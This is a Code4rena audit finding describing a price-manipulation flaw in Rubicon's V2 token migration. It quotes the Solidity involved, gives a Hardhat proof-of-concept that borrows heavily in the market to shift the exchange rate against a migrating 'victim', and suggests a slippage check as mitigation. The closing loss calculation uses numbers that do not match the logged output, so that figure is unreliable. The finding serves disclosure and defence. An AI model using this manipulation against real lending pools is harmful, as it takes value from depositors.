---
tags:
  - lang/solidity
  - sector/lending
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/data-corruption/price-manipulation
  - trigger/low-liquidity
  - trigger/price-manipulation
protocol: "[[Rubicon]]"
auditors:
  - "[[0xNineDec]]"
report: "https://code4rena.com/reports/2023-04-rubicon"
genome:
  - "[[spot-price]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[trigger/low-liquidity]]"
  - "[[trigger/price-manipulation]]"
  - "[[account-ownership]]"
  - "[[fot-slippage]]"
  - "[[integer-bounds]]"
  - "[[oracle-manipulation-resistance]]"
---
# [H-14] Users might get less assets than expected upon migration due to price manipulation attacks

- id: 48953
- impact: HIGH
- protocol: [[Rubicon]]
- reporter: 0xNineDec (Code4rena)
- source: https://code4rena.com/reports/2023-04-rubicon

## Summary


This bug report discusses a potential vulnerability in the `V2Migrator.migrate()` function, where it is possible for external actors to manipulate the price of `BathV2` tokens before a migration takes place. This can result in the migrator receiving underpriced V2 tokens, resulting in losses. The vulnerability lies in the `CToken.mintFresh()` function, where the exchange rate can be manipulated to harm subsequent minters. This can be done by increasing the `totalSupply` or `totalCash` of the pool. A proof of concept is provided, showing how an attacker can manipulate the price of the V2 token by borrowing in the same market. To mitigate this vulnerability, it is suggested to simulate the amount of underlying tokens users would receive if they redeem the entire amount of `BathV2` tokens immediately after migrating and allowing users to set a slippage on the amount of underlying tokens they would receive. The team behind the project has acknowledged the issue and is working on a solution. 

## Details


It is possible to manipulate the price of `BathV2` tokens before a migration and consequently the migrator will receive underpriced V2 tokens, incurring losses.

The migration process of `V2Migrator.migrate()` hands in the user's `BathV1` balance in exchange of its underlying. Then, proceeds to mint the counterpart of `BathV2` tokens providing the same amount of recovered underlying tokens:

```solidity
function migrate(IBathToken bathTokenV1) external {
    //////////////// V1 WITHDRAWAL ////////////////
    uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);
    require(bathBalance > 0, "migrate: ZERO AMOUNT");

    /// @dev approve first
    bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);

    // withdraw all tokens from the pool
    uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);

    //////////////// V2 DEPOSIT ////////////////
    IERC20 underlying = bathTokenV1.underlyingToken();
    address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];

    underlying.approve(bathTokenV2, amountWithdrawn);
    require(
        CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,
        "migrate: MINT FAILED"
    );
    /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function
    IERC20(bathTokenV2).transfer(
        msg.sender,
        IERC20(bathTokenV2).balanceOf(address(this))
    );
    ...
}
```

This process can be abused from external actors when the V2 pool has low liquidity to manipulate the price of the V2 tokens considerably changing the amount of V2 tokens received by the migrating user.

The amount of V2 tokens (`CTokens`) that are minted are calculated after accruing the respective interests in `CToken.mintFresh()`:

```solidity
function mintFresh(address minter, uint mintAmount) internal {
    // ... minting checks  ...

    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});

    uint mintTokens = div_(actualMintAmount, exchangeRate);

    /*
    * We calculate the new total supply of cTokens and minter token balance, checking for overflow:
    *  totalSupplyNew = totalSupply + mintTokens
    *  accountTokensNew = accountTokens[minter] + mintTokens
    * And write them into storage
    */
    totalSupply = totalSupply + mintTokens;
    accountTokens[minter] = accountTokens[minter] + mintTokens;

    /* We emit a Mint event, and a Transfer event */
    emit Mint(minter, actualMintAmount, mintTokens);
    emit Transfer(address(this), minter, mintTokens);

    /* We call the defense hook */
    // unused function
    // comptroller.mintVerify(address(this), minter, actualMintAmount, mintTokens);

}
```

An attacker is able to manipulate the `exchangeRate` so it harms the subsequent minters:

```solidity
function exchangeRateStoredInternal() virtual internal view returns (uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        /*
            * If there are no tokens minted:
            *  exchangeRate = initialExchangeRate
            */
        return initialExchangeRateMantissa;
    } else {
        /*
            * Otherwise:
            *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
            */
        uint totalCash = getCashPrior();
        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;
        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;

        return exchangeRate;
    }
}
```

Essentially, more tokens will be minted if the rate is decreased, as it is dividing the `actualMintAmount`, which could be done by increasing the `totalSupply`. The opposite effect can be done by increasing the `totalCash` or the `totalBorrows`, for example.

### Proof of Concept

This scenario can be abused by attackers willing to harm other users that are migrating from one type of token to another, knowing that the liquidity of the pool is low.

The following script shows how an attacker is able to manipulate the price of the V2 token by borrowing in the same market. The output shows both scenarios, when the price is manipulated and when it is under normal conditions.

```ts
  it("can manipulate the migration yield", async function () {
    const { testCoin, migrator, bathTokenV1, bathTokenV2, owner, otherAccount, comptroller } = await loadFixture(
      deployBathTokensFixture
    );
    // *** POOLS UTILITY
    const PriceOracleFactory = await ethers.getContractFactory(
      "DummyPriceOracle"
    );
    const priceOracle = await PriceOracleFactory.deploy();
    await priceOracle.addCtoken(testCoin.address, parseUnits("1", 30));
    await priceOracle.addCtoken(bathTokenV2.address, parseUnits("1", 30));

    await comptroller._setPriceOracle(priceOracle.address);
    await comptroller._supportMarket(bathTokenV2.address)

    await comptroller._setCollateralFactor(
      bathTokenV2.address,
      parseUnits("0.9", 18)
    ); // 90% of collateral is borrowable
    await comptroller._setBorrowPaused(bathTokenV2.address, false)

    const simulatedFlashloanAmount = 10_000_000
    await testCoin.connect(otherAccount).faucetWithAmountUnchecked(simulatedFlashloanAmount); // 10MM flashloan of testCoins
    const initialTestBalance = await testCoin.balanceOf(otherAccount.address)
    console.log(`Initial - TestCoin Balance [Attacker]: ${initialTestBalance}`)
    
    // A big borrow lands before the migration
    await testCoin.connect(otherAccount).approve(bathTokenV2.address, initialTestBalance);
    await bathTokenV2.connect(otherAccount).mint(initialTestBalance);
    console.log(`\nBefore Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)
    await bathTokenV2.connect(otherAccount).borrow(initialTestBalance.mul(89).div(100));
    console.log(`After Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)

    // ======= Comment/Uncomment this for the manipulated scenario ===========
    // await testCoin.connect(otherAccount).approve(bathTokenV2.address, ethers.constants.MaxUint256);
    // await bathTokenV2.connect(otherAccount).repayBorrow((await testCoin.balanceOf(otherAccount.address)))
    // =======================================================================

    // bath balance before migration
    const bathTokenV1BalanceBefore = await bathTokenV1.balanceOf(owner.address);
    const bathTokenV2BalanceBefore = await bathTokenV2.balanceOf(owner.address);
    console.log(`\nBefore Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceBefore}`)
    console.log(`Before Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceBefore}`)

    await bathTokenV1.approve(migrator.address, bathTokenV1BalanceBefore);
    await migrator.migrate(bathTokenV1.address);

    // bath balance after migration
    const bathTokenV1BalanceAfter = await bathTokenV1.balanceOf(owner.address);
    const bathTokenV2BalanceAfter = await bathTokenV2.balanceOf(owner.address);

    console.log(`\nAfter Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceAfter}`)
    console.log(`After Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceAfter}`)

    const underlyingBalanceBefore = await testCoin.balanceOf(owner.address);
    await bathTokenV2.approve(bathTokenV2.address, bathTokenV2BalanceAfter);
    await bathTokenV2.redeem(bathTokenV2BalanceAfter);
    const underlyingBalanceAfter = await testCoin.balanceOf(owner.address);
    console.log(`\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: ${underlyingBalanceAfter}`)
    console.log(`After Redemption - BathTokenV2 Balance [Victim]: ${await bathTokenV2.balanceOf(owner.address)}`)
  });
```

```
- WITH A BIG BORROW BEFORE THE MIGRATION, WITHOUT REPAYMENT
Initial - TestCoin Balance [Attacker]: 10000000000000000000000000

Before Borrow - TestCoin Balance [Attacker]: 0
After Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000

Before Migration - BathTokenV1 Balance [Victim]: 14999999999999999000
Before Migration - BathTokenV2 Balance [Victim]: 0

After Migration - BathTokenV1 Balance [Victim]: 0
After Migration - BathTokenV2 Balance [Victim]: 74977479826

After Redemption - TestCoin (Underlying) Balance [Victim]: 9899995505034745960181
After Redemption - BathTokenV2 Balance [Victim]: 0
```

```
- WITH A BIG BORROW BEFORE THE MIGRATION, WITH REPAYMENT
Initial - TestCoin Balance [Attacker]: 10000000000000000000000000

Before Borrow - TestCoin Balance [Attacker]: 0
After Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000

Before Migration - BathTokenV1 Balance [Victim]: 14999999999999999000
Before Migration - BathTokenV2 Balance [Victim]: 0

After Migration - BathTokenV1 Balance [Victim]: 0
After Migration - BathTokenV2 Balance [Victim]: 74977479826

After Redemption - TestCoin (Underlying) Balance [Victim]: 9899995500999977864007
After Redemption - BathTokenV2 Balance [Victim]: 0
```

It is simulating the amount of underlying tokens that the victim would receive in either cases. The difference between the scenario A and B (without repayment and repaying the borrow) is: `WITHOUT_REPAYING - WITH_REPAYMENT = 19899995499999977864007 - 19899995504034745960181 = -4034768096174`, considering that the `TestCoin` has 8 decimals and is a valuable token (like `WBTC`), the loss of migrating will mean `40347` of tokens, even if the price is 1 USD per token, the loss is considerable.

### Mitigation

Simulate the amount of underlying tokens users would get if they redeem the whole `BathV2` amount immediately after migrating and allow users to set up a slippage on the amount of underlying tokens they would get (comparing against the simulated amount).

**[daoio (Rubicon) acknowledged](https://github.com/code-423n4/2023-04-rubicon-findings/issues/497#issuecomment-1534851464)**

***
